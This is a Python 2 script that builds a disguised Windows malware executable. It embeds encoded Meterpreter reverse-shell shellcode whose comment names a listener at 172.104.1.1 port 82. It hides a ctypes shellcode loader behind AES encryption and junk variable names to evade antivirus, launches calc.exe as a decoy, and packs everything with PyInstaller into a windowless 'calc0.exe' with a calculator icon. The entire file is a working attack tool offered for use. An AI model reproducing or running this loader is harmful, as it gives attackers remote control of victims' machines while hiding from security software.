#-*- coding: utf-8 -*-
import Crypto.Cipher.AES as AES
import os
import random
import string
import shutil
import time

# 是的，这里99.99%代码都是Ctrl+c和Ctrl+v
# msfvenom  -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=messagebox LHOST=172.104.1.1 LPORT=82 -f c -i 4 -e x86/shikata_ga_nai

shellcode=("\xbb\x14\x4a\x84\x4f\xdd\xc7\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x85\x31\x58\x15\x83\xe8\xfc\x03\x58\x11\xe2\xe1\xf4\x88\x3e"
"\xd3\x22\x4a\x1d\x3a\x40\x48\x6a\xe6\x80\x59\x23\x69\x50\x9b"
"\x40\xa4\x24\x12\x4a\xb8\xb7\x12\x92\x80\x75\x7e\x30\x70\x9f"
"\x00\xc0\x8c\x26\xcf\xa5\x4b\x50\x4e\xde\x75\xb9\x9c\x29\x62"
"\xf4\x16\xe7\x49\xb4\x60\xb8\x10\xb1\x69\x61\x0a\xff\xe9\xbb"
"\x55\x7a\x51\x6a\x7a\xf5\x26\x90\x87\x89\x91\x2c\xb9\x59\x85"
"\xb1\x5e\xa1\x70\x70\x64\x4b\xdb\xf0\xd1\x22\xe9\x05\x6f\x6e"
"\x95\xbb\x98\x88\xad\xbb\x95\x1b\x41\x8e\xf1\x09\x0a\x50\x5b"
"\x99\x2b\x1f\xcc\x45\xf8\x16\x6e\xd9\xb1\x63\x52\x28\x7f\x34"
"\x1c\xd8\x8a\xa3\x59\xd4\xc9\x96\xf3\x28\x86\x20\x3d\x6d\x7f"
"\x54\xee\x73")

#shellcode add \ 
def bsadd(shellcode):
    bscode = ''
    for byte in shellcode:
        bscode += '\\x%s' % byte.encode('hex')
    return bscode

def randomVar():
    return ''.join(random.sample(string.ascii_lowercase, 8))

def randomJunk():
    newString = ''
    for i in xrange(random.randint(150, 200)):
        newString += ''.join(random.sample(string.ascii_lowercase, 3))
    return newString

def do_Encryption(payload):
    counter = os.urandom(16)
    key = os.urandom(32)
    randkey = randomVar()
    randcounter = randomVar()
    randcipher = randomVar()
    randdecrypt = randomJunk()
    randshellcode = randomJunk()
    randctypes = randomJunk()
    randaes = randomJunk()
    randsub = randomJunk()
    
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode))
    newpayload = "# -*- coding: utf-8 -*- \n"
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "import Crypto.Cipher.AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
    newpayload += "import subprocess as %s \n" % (randsub) 
    newpayload += "%s.call('c:\\windows\\system32\\calc.exe') \n" % (randsub)
    newpayload += "%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
    newpayload += "%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
    newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
    newpayload += "%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
    newpayload += "%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.encode('hex'))
    newpayload += "exec(%s)" % randcipher
    return newpayload

def gen_Payload():
    pre="""shellcode = bytearray('%s')
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
"""
    return pre

with open('./calc0.py', 'w+') as f:
    f.write(do_Encryption(gen_Payload() % bsadd(shellcode)))
    f.close()

time.sleep(1)
execkey = ''.join(random.sample(string.ascii_lowercase, 16))
os.popen('pyinstaller --specpath Payload --workpath Payload --distpath Payload calc0.py -w -F -i calc.ico --key ' + execkey)
time.sleep(1)
shutil.move('.\Payload\calc0.exe','calc0.exe')
shutil.rmtree('Payload')
os.remove('calc0.py')
